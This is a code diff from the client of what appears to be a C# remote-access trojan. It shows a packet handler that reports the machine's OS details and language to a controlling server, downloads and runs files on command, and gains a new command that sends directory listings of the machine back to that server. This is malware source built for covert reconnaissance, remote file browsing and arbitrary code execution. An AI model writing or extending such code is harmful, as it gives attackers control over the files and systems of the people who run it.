@@ -70,10 +70,10 @@ namespace Client.Networking
             switch (packet.PType)
             {
                 case PacketType.ListClient:
-                    Packet r = new Packet(PacketType.ListClient, _id.ToString());
+                    Packet r_list = new Packet(PacketType.ListClient, _id.ToString());
                     string[] OSInfo = { Client.Info.GetOSName(), Client.Info.GetOSInfo(), Client.Info.GetLocalLanguage()};
-                    r.PData.AddRange(OSInfo);
-                    _socket.Send(r.ToBytes());
+                    r_list.PData.AddRange(OSInfo);
+                    _socket.Send(r_list.ToBytes());
                     Console.WriteLine("Sending client info");
                     break;
                 case PacketType.DownloadAndExecute:
@@ -86,6 +86,14 @@ namespace Client.Networking
                     System.Diagnostics.Process.Start(filePath);
                     Console.WriteLine("Downloaded {0} and stored at {1}", packet.PData[0], filePath);
                     break;
+                case PacketType.FileDirectoryList:
+                    Packet r_file = new Packet(PacketType.FileDirectoryList, _id.ToString());
+                    (string[] ret, int n) = Client.Info.FileDirectoryList(packet.PData[0]);
+                    r_file.PData.AddRange(ret);
+                    r_file.PNum = n;
+                    _socket.Send(r_file.ToBytes());
+                    break;
+                    
             }
         }
     }
